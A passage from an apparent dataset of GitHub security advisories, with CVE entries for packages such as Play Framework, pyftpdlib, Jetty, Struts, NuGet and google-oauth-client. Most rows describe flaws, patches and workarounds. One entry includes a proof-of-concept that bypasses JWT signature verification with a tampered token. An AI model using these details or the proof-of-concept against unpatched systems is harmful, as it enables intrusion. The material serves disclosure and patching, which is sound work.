  3.1. Create & publish a new release excluding those files (ref. [""Keeping files out of your Package""](https://docs.npmjs.com/cli/v8/using-npm/developers#keeping-files-out-of-your-package))
  3.2. Deprecate the old package (ex. `npm deprecate <pkg>[@<version>] <message>`)
  3.3. Revoke or rotate any sensitive information (ex. passwords, tokens, secrets etc.) which might have been exposed
### References
- [CVE-2022-29244](https://nvd.nist.gov/vuln/detail/CVE-2022-29244)
- [`npm-packlist`](https://github.com/npm/npm-packlist)
- [`libnpmpack`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpack)
- [`libnpmpublish`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpublish)",npm
2520,19975,bottle,GHSA-xhp9-4947-rq78,CVE-2022-31799,https://github.com/advisories/GHSA-xhp9-4947-rq78,critical,2022-06-03 00:01:15 UTC,Denial of service in bottle,Bottle before 0.12.20 mishandles errors during early request binding.,pip
2521,28908,flower,GHSA-q4qm-xhf9-4p8f,CVE-2022-30034,https://github.com/advisories/GHSA-q4qm-xhf9-4p8f,high,2022-06-03 00:01:07 UTC,Flower OAuth authentication bypass,"All versions of Flower, a web UI for the Celery Python RPC framework, as of 05-02-2022 are vulnerable to an OAuth authentication bypass. An attacker could then access the Flower API to discover and invoke arbitrary Celery RPC calls or deny service by shutting down Celery task nodes. A fix was released in version 1.2.0.",pip
2522,34747,com.typesafe.play:play_2.12,GHSA-p9p4-97g9-wcrh,CVE-2022-31023,https://github.com/advisories/GHSA-p9p4-97g9-wcrh,moderate,2022-06-03 22:19:23 UTC,Dev error stack trace leaking into prod in Play Framework,"### Impact

Play Framework, when run in dev mode, shows verbose errors for easy debugging, including an exception stack trace. Play does this by configuring its `DefaultHttpErrorHandler` to do so based on the application mode. In its Scala API Play also provides a static object `DefaultHttpErrorHandler` that is configured to always show verbose errors. This is used as a default value in some Play APIs, so it is possible to inadvertently use this version in production. It is also possible to improperly configure the `DefaultHttpErrorHandler` object instance as the injected error handler.  Both of these situations could result in verbose errors displaying to users in a production application, which could expose sensitive information from the application.

In particular the constructor for `CORSFilter` and `apply` method for `CORSActionBuilder` use the static object `DefaultHttpErrorHandler` as a default value.

### Patches

This is patched in Play Framework 2.8.16. The `DefaultHttpErrorHandler` object has been changed to use the prod-mode behavior, and `DevHttpErrorHandler` has been introduced for the dev-mode behavior.

### Workarounds

When constructing a `CORSFilter` or `CORSActionBuilder`, ensure that a properly-configured error handler is passed. Generally this should be done by using the `HttpErrorHandler` instance provided through dependency injection or through Play's `BuiltInComponents`. Ensure that your application is not using the `DefaultHttpErrorHandler` static object in any code that may be run in production.

### References
https://www.playframework.com/documentation/2.8.x/ScalaErrorHandling#Supplying-a-custom-error-handler
https://www.playframework.com/documentation/2.8.x/JavaErrorHandling#Supplying-a-custom-error-handler

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [playframework/playframework](https://github.com/playframework/playframework/)
* Email us at [example email address](mailto:example@example.com)
",maven
2523,34747,com.typesafe.play:play_2.12,GHSA-v8x6-59g4-5g3w,CVE-2022-31018,https://github.com/advisories/GHSA-v8x6-59g4-5g3w,high,2022-06-03 22:18:58 UTC,Denial of service binding form from JSON in Play Framework,"### Impact

A denial-of-service vulnerability has been discovered in Play's forms library, in both the Scala and Java APIs. This can occur when using either the `Form#bindFromRequest` method on a JSON request body or the `Form#bind` method directly on a JSON value. If the JSON data being bound to the form contains a deeply-nested JSON object or array, the form binding implementation may consume all available heap space and cause an `OutOfMemoryError`. If executing on the default dispatcher and `akka.jvm-exit-on-fatal-error` is enabled—as it is by default—then this can crash the application process.

`Form.bindFromRequest` is vulnerable when using any body parser that produces a type of `AnyContent` or `JsValue` in Scala, or one that can produce a `JsonNode` in Java. This includes Play's default body parser.

### Patches

This vulnerability been patched in version 2.8.16. There is now a global limit on the depth of a JSON object that can be parsed, which can be configured by the user if necessary.

### Workarounds

Applications that do not need to parse a request body of type `application/json` can switch from the default body parser to another body parser that supports only the specific type of body they expect; for example, the `formUrlEncoded` body parser can be used if the Play action only needs to accept `application/x-www-form-urlencoded`.

",maven
2524,19312,dragonfly,GHSA-fj34-jhjx-xmvv,CVE-2021-33473,https://github.com/advisories/GHSA-fj34-jhjx-xmvv,critical,2022-06-03 00:00:33 UTC,Arbitrary file write in dragonfly,An argument injection vulnerability in Dragonfly Ruby Gem v1.3.0 allows attackers to read and write arbitrary files when the verify_url option is disabled. This vulnerability is exploited via a crafted URL.,rubygems
2525,19892,ipython,GHSA-7fc2-rm35-2pp7,CVE-2015-5607,https://github.com/advisories/GHSA-7fc2-rm35-2pp7,high,2022-05-17 00:35:13 UTC,IPython vulnerable to cross site request forgery (CSRF),IPython (Interactive Python) is a command shell. Cross-site request forgery in the REST API is possible in in IPython 2 and 3. Versions 2.4.1 and 3.2.3 contain patches.,pip
2526,19858,Pygments,GHSA-fff8-4w9p-7v76,CVE-2015-8557,https://github.com/advisories/GHSA-fff8-4w9p-7v76,critical,2022-05-17 02:37:56 UTC,Command Injection in Pygments,The FontManager._get_nix_font_path function in formatters/img.py in Pygments 1.2.2 through 2.0.2 allows remote attackers to execute arbitrary commands via shell metacharacters in a font name.,pip
2527,30443,vyper,GHSA-4v9q-cgpw-cf38,CVE-2022-29255,https://github.com/advisories/GHSA-4v9q-cgpw-cf38,high,2022-06-06 21:23:58 UTC,Multiple evaluation of contract address in call in vyper,"### Impact
when a calling an external contract with no return value, the contract address could be evaluated twice. this is usually only an efficiency problem, but if evaluation of the contract address has side effects, it could result in double evaluation of the side effects.

in the following example, `Foo(msg.sender).bar()` is the contract address for the following call (to `.foo()`), and could get evaluated twice

```vyper
interface Foo:
    def foo(): nonpayable
    def bar() -> address: nonpayable

@external
def do_stuff():
    Foo(Foo(msg.sender).bar()).foo()
```

### Patches
v0.3.4

### Workarounds
assign contract addresses to variables. the above example would change to
```vyper
@external
def do_stuff():
    t: Foo = Foo(msg.sender).bar()
    t.foo()
```

### References

### For more information
",pip
2528,34038,org.mortbay.jetty:jetty,GHSA-8h77-9vh5-hw5g,CVE-2007-5613,https://github.com/advisories/GHSA-8h77-9vh5-hw5g,moderate,2022-05-01 18:35:00 UTC,Mortbay Jetty vulnerable to Cross-site scripting,Cross-site scripting (XSS) vulnerability in Dump Servlet in Mortbay Jetty before 6.1.6rc1 allows remote attackers to inject arbitrary web script or HTML via unspecified parameters and cookies.,maven
2529,35341,struts:struts,GHSA-7qwv-cwgj-c8rj,CVE-2006-1547,https://github.com/advisories/GHSA-7qwv-cwgj-c8rj,high,2022-05-01 06:50:42 UTC,Improper Input Validation in Apache Struts,"ActionForm in Apache Software Foundation (ASF) Struts before 1.2.9 with BeanUtils 1.7 allows remote attackers to cause a denial of service via a multipart/form-data encoded form with a parameter name that references the public getMultipartRequestHandler method, which provides further access to elements in the CommonsMultipartRequestHandler implementation and BeanUtils.",maven
2530,35341,struts:struts,GHSA-vf8g-mpmw-qv87,CVE-2006-1546,https://github.com/advisories/GHSA-vf8g-mpmw-qv87,high,2022-05-01 06:50:42 UTC,Apache Struts vulnerable to Improper Input Validation,"Apache Software Foundation (ASF) Struts before 1.2.9 allows remote attackers to bypass validation via a request with a 'org.apache.struts.taglib.html.Constants.CANCEL' parameter, which causes the action to be canceled but would not be detected from applications that do not use the isCancelled check.",maven
2531,35341,struts:struts,GHSA-p3vw-fvwx-qcv5,CVE-2006-1548,https://github.com/advisories/GHSA-p3vw-fvwx-qcv5,low,2022-05-01 06:50:42 UTC,Cross-site scripting in Apache Struts,"Cross-site scripting (XSS) vulnerability in (1) LookupDispatchAction and possibly (2) DispatchAction and (3) ActionDispatcher in Apache Software Foundation (ASF) Struts before 1.2.9 allows remote attackers to inject arbitrary web script or HTML via the parameter name, which is not filtered in the resulting error message.",maven
2532,34041,org.elasticsearch:elasticsearch,GHSA-wh6w-69xc-5rq5,CVE-2022-23712,https://github.com/advisories/GHSA-wh6w-69xc-5rq5,high,2022-06-07 00:00:33 UTC,Improper Check for Unusual or Exceptional Conditions in Elasticsearch,"A Denial of Service flaw was discovered in Elasticsearch 8.0.0 through 8.2.0. Using this vulnerability, an unauthenticated attacker could forcibly shut down an Elasticsearch node with a specifically formatted network request. Version 8.2.1 contains a patch.",maven
2533,38644,org.jodd:jodd-http,GHSA-pp3c-cf6j-m3ff,CVE-2022-29631,https://github.com/advisories/GHSA-pp3c-cf6j-m3ff,high,2022-06-07 00:00:31 UTC,Server-Side Request Forgery in Jodd HTTP,Jodd HTTP v6.0.9 was discovered to contain multiple CLRF injection vulnerabilities via the components jodd.http.HttpRequest#set and `jodd.http.HttpRequest#send. These vulnerabilities allow attackers to execute Server-Side Request Forgery (SSRF) via a crafted TCP payload.,maven
2534,34944,com.sun.faces:jsf-api,GHSA-vv6j-5x58-q2c3,CVE-2008-1285,https://github.com/advisories/GHSA-vv6j-5x58-q2c3,moderate,2022-05-01 23:38:35 UTC,Cross-site scripting (XSS) vulnerability in Sun Java Server Faces (JSF),Cross-site scripting (XSS) vulnerability in Sun Java Server Faces (JSF) 1.2 before 1.2_08 allows remote attackers to inject arbitrary web script or HTML via unknown vectors.,maven
2535,28751,pyftpdlib,GHSA-cx59-cp6c-9fr8,CVE-2007-6740,https://github.com/advisories/GHSA-cx59-cp6c-9fr8,moderate,2022-05-01 18:45:58 UTC,pyftpdlib vulnerable to allocation of resources without limits,"The ftp_STOU function in FTPServer.py in pyftpdlib before 0.2.0 does not limit the number of attempts to discover a unique filename, which might allow remote authenticated users to cause a denial of service via a STOU command.",pip
2536,34038,org.mortbay.jetty:jetty,GHSA-fvh3-4v5r-cvvc,CVE-2007-5614,https://github.com/advisories/GHSA-fvh3-4v5r-cvvc,high,2022-05-01 18:35:01 UTC,Improper Authentication in Mortbay Jetty,"Mortbay Jetty before 6.1.6rc1 does not properly handle ""certain quote sequences"" in HTML cookie parameters, which allows remote attackers to hijack browser sessions via unspecified vectors.",maven
2537,28751,pyftpdlib,GHSA-8xgx-75qw-6268,CVE-2007-6741,https://github.com/advisories/GHSA-8xgx-75qw-6268,moderate,2022-05-01 18:45:58 UTC,Improper privilege management in pyftpdlib,"The ftp_PORT function in FTPServer.py in pyftpdlib before 0.2.0 does not prevent TCP connections to privileged ports if the destination IP address matches the source IP address of the connection from the FTP client, which might allow remote authenticated users to conduct FTP bounce attacks via crafted FTP data, as demonstrated by an FTP bounce attack against a NAT server, a related issue to CVE-1999-0017.",pip
2538,28751,pyftpdlib,GHSA-5f3f-pg2c-cxcv,CVE-2007-6739,https://github.com/advisories/GHSA-5f3f-pg2c-cxcv,moderate,2022-05-01 18:45:57 UTC,Improper Input Validation in pyftpdlib,FTPServer.py in pyftpdlib before 0.2.0 allows remote attackers to cause a denial of service via a long command.,pip
2539,28751,pyftpdlib,GHSA-9x66-ghqx-8g5r,CVE-2007-6737,https://github.com/advisories/GHSA-9x66-ghqx-8g5r,high,2022-05-01 18:45:57 UTC,Improper Authentication in pyftpdlib,"FTPServer.py in pyftpdlib before 0.2.0 does not increment the attempted_logins count for a USER command that specifies an invalid username, which makes it easier for remote attackers to obtain access via a brute-force attack.",pip
2540,28751,pyftpdlib,GHSA-f8wg-36r9-7f4q,CVE-2007-6736,https://github.com/advisories/GHSA-f8wg-36r9-7f4q,moderate,2022-05-01 18:45:57 UTC,Directory Traversal in pyftpdlib,"Python FTP server library provides a high-level portable interface to easily write very efficient, scalable and asynchronous FTP servers with Python. Multiple directory traversal vulnerabilities in FTPServer.py in pyftpdlib before 0.2.0 allow remote authenticated users to access arbitrary files and directories via a .. (dot dot) in a (1) LIST, (2) STOR, or (3) RETR command.",pip
2541,28751,pyftpdlib,GHSA-8p2c-fghc-9hj4,CVE-2008-7264,https://github.com/advisories/GHSA-8p2c-fghc-9hj4,moderate,2022-05-17 05:47:38 UTC,Improper input validation in pyftpdlib,The ftp_QUIT function in ftpserver.py in pyftpdlib before 0.5.0 allows remote authenticated users to cause a denial of service (file descriptor exhaustion and daemon outage) by sending a QUIT command during a disallowed data-transfer attempt.,pip
2542,35471,com.google.oauth-client:google-oauth-client,GHSA-xh97-72ww-2w58,CVE-2021-22573,https://github.com/advisories/GHSA-xh97-72ww-2w58,high,2022-05-04 00:00:22 UTC,Improper Verification of Cryptographic Signature in google-oauth-java-client,"### Summary
The vulnerability impacts only users of the IdTokenVerifier class. The verify method in IdTokenVerifier does not validate the signature before verifying the claims (e.g., iss, aud, etc.). Signature verification makes sure that the token's payload comes from valid provider, not from someone else.

An attacker can provide a compromised token with modified payload like email or phone number. The token will pass the validation by the library. Once verified, modified payload can be used by the application. 

If the application sends verified IdToken to other service as is like for auth - the risk is low, because the backend of the service is expected to check the signature and fail the request. 

Reporter: [Tamjid al Rahat](https://github.com/tamjidrahat), contributor

### Patches
The issue was fixed in the 1.33.3 version of the library

### Proof of Concept
To reproduce, one needs to call the verify function with an IdToken instance that contains a malformed signature to successfully bypass the checks inside the verify function.

```
  /** A default http transport factory for testing */
  static class DefaultHttpTransportFactory implements HttpTransportFactory {
    public HttpTransport create() {
      return new NetHttpTransport();
    }
  }

// The below token has some modified bits in the signature
 private static final String SERVICE_ACCOUNT_RS256_TOKEN_BAD_SIGNATURE =    
""eyJhbGciOiJSUzI1NiIsImtpZCI6IjJlZjc3YjM4YTFiMDM3MDQ4NzA0MzkxNmFjYmYyN2Q3NG"" +
""VkZDA4YjEiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJodHRwczovL2V4YW1wbGUuY29tL2F1ZGllbm"" +
""NlIiwiZXhwIjoxNTg3NjMwNTQzLCJpYXQiOjE1ODc2MjY5NDMsImlzcyI6InNvbWUgaXNzdWVy"" +
""Iiwic3ViIjoic29tZSBzdWJqZWN0In0.gGOQW0qQgs4jGUmCsgRV83RqsJLaEy89-ZOG6p1u0Y26"" +
""FyY06b6Odgd7xXLsSTiiSnch62dl0Lfi9D0x2ByxvsGOCbovmBl2ZZ0zHr1wpc4N0XS9lMUq5RJ"" + 
""QbonDibxXG4nC2zroDfvD0h7i-L8KMXeJb9pYwW7LkmrM_YwYfJnWnZ4bpcsDjojmPeUBlACg7tjjOgBFby"" +
""QZvUtaERJwSRlaWibvNjof7eCVfZChE0PwBpZc_cGqSqKXv544L4ttqdCnm0NjqrTATXwC4gYx"" + 
""ruevkjHfYI5ojcQmXoWDJJ0-_jzfyPE4MFFdCFgzLgnfIOwe5ve0MtquKuv2O0pgvg"";

IdTokenVerifier tokenVerifier =
        new IdTokenVerifier.Builder()
            .setClock(clock)
            .setCertificatesLocation(""https://www.googleapis.com/robot/v1/metadata/x509/integration-tests%40chingor-test.iam.gserviceaccount.com"")
            .setHttpTransportFactory(new DefaultHttpTransportFactory())
            .build();

// verification will return true despite modified signature for versions <1.33.3
tokenVerifier.verify(IdToken.parse(GsonFactory.getDefaultInstance(), SERVICE_ACCOUNT_RS256_TOKEN_BAD_SIGNATURE));

```

### Remediation and Mitigation
Update to the version 1.33.3 or higher 

If the library used indirectly or cannot be updated for any reason you can use similar IdToken verifiers provided by Google that already has signature verification. For example: 
[google-auth-library-java](https://github.com/googleapis/google-auth-library-java/blob/main/oauth2_http/java/com/google/auth/oauth2/TokenVerifier.java)
[google-api-java-client](https://github.com/googleapis/google-api-java-client/blob/main/google-api-client/src/main/java/com/google/api/client/googleapis/auth/oauth2/GoogleIdTokenVerifier.java)

###Timeline
Date reported: 12 Dec 2021
Date fixed: 13 Apr 2022
Date disclosed: 2 May 2022

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [google-oauth-java-client](https://github.com/googleapis/google-oauth-java-client) repo",maven
2543,15935,semantic-release,GHSA-x2pg-mjhr-2m5x,CVE-2022-31051,https://github.com/advisories/GHSA-x2pg-mjhr-2m5x,moderate,2022-06-09 23:51:25 UTC,Exposure of Sensitive Information to an Unauthorized Actor in semantic-release,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Secrets that would normally be masked by semantic-release can be accidentally disclosed if they contain characters that are excluded from uri encoding by [encodeURI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI). Occurrence is further limited to execution contexts where push access to the related repository is not available without modifying the repository url to inject credentials.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Fixed in 19.0.3

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Secrets that do not contain characters that are excluded from encoding with `encodeURI` when included in a URL are already masked properly.

### References
_Are there any links users can visit to find out more?_
* https://github.com/semantic-release/semantic-release/releases/tag/v19.0.3
* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI

### For more information
If you have any questions or comments about this advisory:
* Open a discussion in [semantic-release discussions](https://github.com/semantic-release/semantic-release/discussions)
",npm
2544,28751,pyftpdlib,GHSA-q6w2-jxcm-2crj,CVE-2008-7263,https://github.com/advisories/GHSA-q6w2-jxcm-2crj,high,2022-05-17 05:47:38 UTC,Improper Authentication in pyftpdlib,"ftpserver.py in pyftpdlib before 0.5.0 does not delay its response after receiving an invalid login attempt, which makes it easier for remote attackers to obtain access via a brute-force attack.",pip
2545,28751,pyftpdlib,GHSA-jw88-wxv5-7c4f,CVE-2008-7262,https://github.com/advisories/GHSA-jw88-wxv5-7c4f,moderate,2022-05-17 05:47:38 UTC,Directory traversal in pyftpdlib,"Multiple directory traversal vulnerabilities in FTPServer.py in pyftpdlib before 0.3.0 allow remote authenticated users to access arbitrary files and directories via vectors involving a symlink in a pathname to a (1) CWD, (2) DELE, (3) STOR, or (4) RETR command.",pip
2546,20075,cookiecutter,GHSA-f4q6-9qm4-h8j4,CVE-2022-24065,https://github.com/advisories/GHSA-f4q6-9qm4-h8j4,high,2022-06-09 23:48:49 UTC,OS Command Injection in cookiecutter,"The package cookiecutter before 2.1.1 is vulnerable to Command Injection via hg argument injection. When calling the cookiecutter function from Python code with the checkout parameter, it is passed to the hg checkout command in a way that additional flags can be set. The additional flags can be used to perform a command injection.",pip
2547,18898,mechanize,GHSA-64qm-hrgp-pgr9,CVE-2022-31033,https://github.com/advisories/GHSA-64qm-hrgp-pgr9,moderate,2022-06-09 23:47:57 UTC,Mechanize before v2.8.5 vulnerable to authorization header leak on port redirect,"**Summary**

Mechanize (rubygem) `< v2.8.5` leaks the `Authorization` header after a redirect to a different port on the same site.

**Mitigation**

Upgrade to Mechanize v2.8.5 or later.

**Notes**

See [https://curl.se/docs/CVE-2022-27776.html](CVE-2022-27776) for a similar vulnerability in curl.

Cookies are shared with a server at a different port on the same site, per https://datatracker.ietf.org/doc/html/rfc6265#section-8.5 which states in part:

> Cookies do not provide isolation by port.  If a cookie is readable
> by a service running on one port, the cookie is also readable by a
> service running on another port of the same server.  If a cookie is
> writable by a service on one port, the cookie is also writable by a
> service running on another port of the same server.  For this
> reason, servers SHOULD NOT both run mutually distrusting services on
> different ports of the same host and use cookies to store security-
> sensitive information.
",rubygems
2548,33885,org.apache.httpcomponents:httpclient,GHSA-pqwh-44jj-p5rm,CVE-2013-4366,https://github.com/advisories/GHSA-pqwh-44jj-p5rm,critical,2022-05-13 01:25:03 UTC,Hostname verification in Apache HttpClient 4.3 was disabled by default,"http/impl/client/HttpClientBuilder.java in Apache HttpClient 4.3.x before 4.3.1 does not ensure that X509HostnameVerifier is not null, which allows attackers to have unspecified impact via vectors involving hostname verification.",maven
2549,34038,org.mortbay.jetty:jetty,GHSA-6jxp-7g74-2rc3,CVE-2009-4611,https://github.com/advisories/GHSA-6jxp-7g74-2rc3,high,2022-05-02 03:56:13 UTC,Improper input validation in Mort Bay Jetty,"Mort Bay Jetty 6.x through 6.1.22 and 7.0.0 writes backtrace data without sanitizing non-printable characters, which might allow remote attackers to modify a window's title, or possibly execute arbitrary commands or overwrite files, via an HTTP request containing an escape sequence for a terminal emulator, related to (1) a string value in the Age parameter to the default URI for the Cookie Dump Servlet in test-jetty-webapp/src/main/java/com/acme/CookieDump.java under cookie/, (2) an alphabetic value in the A parameter to jsp/expr.jsp, or (3) an alphabetic value in the Content-Length HTTP header to an arbitrary application.",maven
2550,36377,com.alibaba:dubbo,GHSA-gm48-83x4-84jg,CVE-2022-24969,https://github.com/advisories/GHSA-gm48-83x4-84jg,moderate,2022-06-10 00:00:56 UTC,Server-side request forgery in Apache Dubbo,"bypass CVE-2021-25640 > In Apache Dubbo prior to 2.6.12 and 2.7.15, the usage of parseURL method will lead to the bypass of the white host check which can cause open redirect or SSRF vulnerability.",maven
2551,13141,NuGet.CommandLine,GHSA-3885-8gqc-3wpf,CVE-2022-30184,https://github.com/advisories/GHSA-3885-8gqc-3wpf,moderate,2022-06-14 21:57:52 UTC,Potential leak of NuGet.org API key,"### Description 

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 6.0 and .NET Core 3.1, NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat version range from 3.5.0 to 6.2.0). This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A vulnerability exists in .NET 6.0, .NET Core 3.1, and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat version range from 3.5.0 to 6.2.0) where a nuget.org api key could leak due to an incorrect comparison with a server url.

### Affected software 

#### NuGet & NuGet Packages

- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 6.2.0 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 6.0.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 5.11.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 5.9.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 5.7.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 4.9.4 version or earlier.

#### .NET SDK(s)

- Any .NET 6.0 application running on .NET 6.0.5 or earlier.
- Any .NET 3.1 application running on .NET Core 3.1.25 or earlier.

### Patches 

- If you're using NuGet.exe 6.2.0 or lower, you should download and install 6.2.1 from https://dist.nuget.org/win-x86-commandline/v6.2.1/nuget.exe. 

- If you're using NuGet.exe 6.0.1 or lower, you should download and install 6.0.2 from https://dist.nuget.org/win-x86-commandline/v6.0.2/nuget.exe. 

- If you're using NuGet.exe 5.11.1 or lower, you should download and install 5.11.2 from https://dist.nuget.org/win-x86-commandline/v5.11.2/nuget.exe. 

- If you're using NuGet.exe 5.9.1 or lower, you should download and install 5.9.2 from https://dist.nuget.org/win-x86-commandline/v5.9.2/nuget.exe. 

- If you're using NuGet.exe 5.7.1 or lower, you should download and install 5.7.2 from https://dist.nuget.org/win-x86-commandline/v4.7.2/nuget.exe. 

- If you're using NuGet.exe 4.9.4 or lower, you should download and install 4.9.5 from https://dist.nuget.org/win-x86-commandline/v4.9.5/nuget.exe. 

- If you're using .NET Core 6.0, you should download and install Runtime 6.0.6 or SDK 6.0.106 (for Visual Studio 2022 v17.0) or SDK 6.0.301 (for Visual Studio 2022 v17.2)  from https://dotnet.microsoft.com/download/dotnet-core/6.0. 

- If you're using .NET Core 3.1, you should download and install Runtime 3.1.26 or SDK 3.1.420 (for Visual Studio 2019 v16.9 or Visual Studio 2011 16.11 or Visual Studio 2022 17.0 or Visual Studio 2022 17.1 ) from https://dotnet.microsoft.com/download/dotnet-core/3.1 

.NET 6.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type ""Check for updates"" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates. 

### Other Details 

Announcement for this issue can be found at https://github.com/NuGet/Announcements/issues/62
 
MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30184",nuget
2552,14636,NuGet.Commands,GHSA-3885-8gqc-3wpf,CVE-2022-30184,https://github.com/advisories/GHSA-3885-8gqc-3wpf,moderate,2022-06-14 21:57:52 UTC,Potential leak of NuGet.org API key,"### Description 

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 6.0 and .NET Core 3.1, NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat version range from 3.5.0 to 6.2.0). This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

A vulnerability exists in .NET 6.0, .NET Core 3.1, and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat version range from 3.5.0 to 6.2.0) where a nuget.org api key could leak due to an incorrect comparison with a server url.

### Affected software 

#### NuGet & NuGet Packages

- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 6.2.0 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 6.0.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 5.11.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 5.9.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 5.7.1 version or earlier.
- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.CommandLine.XPlat 4.9.4 version or earlier.

#### .NET SDK(s)

- Any .NET 6.0 application running on .NET 6.0.5 or earlier.
- Any .NET 3.1 application running on .NET Core 3.1.25 or earlier.

### Patches 

- If you're using NuGet.exe 6.2.0 or lower, you should download and install 6.2.1 from https://dist.nuget.org/win-x86-commandline/v6.2.1/nuget.exe. 

- If you're using NuGet.exe 6.0.1 or lower, you should download and install 6.0.2 from https://dist.nuget.org/win-x86-commandline/v6.0.2/nuget.exe. 

- If you're using NuGet.exe 5.11.1 or lower, you should download and install 5.11.2 from https://dist.nuget.org/win-x86-commandline/v5.11.2/nuget.exe. 

- If you're using NuGet.exe 5.9.1 or lower, you should download and install 5.9.2 from https://dist.nuget.org/win-x86-commandline/v5.9.2/nuget.exe. 

- If you're using NuGet.exe 5.7.1 or lower, you should download and install 5.7.2 from https://dist.nuget.org/win-x86-commandline/v4.7.2/nuget.exe. 

- If you're using NuGet.exe 4.9.4 or lower, you should download and install 4.9.5 from https://dist.nuget.org/win-x86-commandline/v4.9.5/nuget.exe. 

- If you're using .NET Core 6.0, you should download and install Runtime 6.0.6 or SDK 6.0.106 (for Visual Studio 2022 v17.0) or SDK 6.0.301 (for Visual Studio 2022 v17.2)  from https://dotnet.microsoft.com/download/dotnet-core/6.0. 

- If you're using .NET Core 3.1, you should download and install Runtime 3.1.26 or SDK 3.1.420 (for Visual Studio 2019 v16.9 or Visual Studio 2011 16.11 or Visual Studio 2022 17.0 or Visual Studio 2022 17.1 ) from https://dotnet.microsoft.com/download/dotnet-core/3.1 

.NET 6.0 and .NET Core 3.1 updates are also available from Microsoft Update. To access this either type ""Check for updates"" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates. 

### Other Details 

Announcement for this issue can be found at https://github.com/NuGet/Announcements/issues/62
 
MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30184",nuget
2553,34038,org.mortbay.jetty:jetty,GHSA-mq4x-8whh-jx73,CVE-2006-2759,https://github.com/advisories/GHSA-mq4x-8whh-jx73,moderate,2022-05-01 07:02:10 UTC,Improper Input Validation in Mortbay Jetty,"jetty 6.0.x (jetty6) beta16 allows remote attackers to read arbitrary script source code via a capital P in the .jsp extension, and probably other mixed case manipulations.",maven
2554,18934,octokit,GHSA-g28x-pgr3-qqx6,CVE-2022-31072,https://github.com/advisories/GHSA-g28x-pgr3-qqx6,low,2022-06-15 21:24:16 UTC,Octokit gem published with world-writable files,"### Impact

Versions [4.23.0](https://rubygems.org/gems/octokit/versions/4.23.0) and [4.24.0](https://rubygems.org/gems/octokit/versions/4.24.0) of the octokit gem were published containing world-writeable files. 

Specifically, the gem was packed with files having their permissions set to `-rw-rw-rw-` (i.e. 0666) instead of `rw-r--r--` (i.e. 0644). This means everyone who is not the owner (Group and Public) with access to the instance where this release had been installed could modify the world-writable files from this gem. 

Malicious code already present and running on your machine, separate from this package, could modify the gem’s files and change its behavior during runtime.

### Patches
* [octokit 4.25.0](https://rubygems.org/gems/octokit/versions/4.25.0)

### Workarounds
Users can use the previous version of the gem [v4.22.0](https://rubygems.org/gems/octokit/versions/4.22.0). Alternatively, users can modify the file permissions manually until they are able to upgrade to the latest version.

",rubygems
2555,34265,org.jboss.resteasy:resteasy-jaxrs,GHSA-pc54-pchm-xcw6,CVE-2014-7839,https://github.com/advisories/GHSA-pc54-pchm-xcw6,moderate,2022-05-17 04:13:50 UTC,XML External Entity Reference in RESTEasy,"DocumentProvider in RESTEasy 2.3.7 and 3.0.9 does not configure the (1) external-general-entities or (2) external-parameter-entities features, which allows remote attackers to conduct XML external entity (XXE) attacks via unspecified vectors.",maven
2556,34046,org.apache.hadoop:hadoop-common,GHSA-rmpj-7c96-mrg8,CVE-2021-37404,https://github.com/advisories/GHSA-rmpj-7c96-mrg8,critical,2022-06-14 00:00:37 UTC,"Apache Hadoop heap overflow before v2.10.2, v3.2.3, v3.3.2","There is a potential heap buffer overflow in Apache Hadoop libhdfs native code. Opening a file path provided by user without validation may result in a denial of service or arbitrary code execution. Users should upgrade to Apache Hadoop 2.10.2, 3.2.3, 3.3.2 or higher.",maven
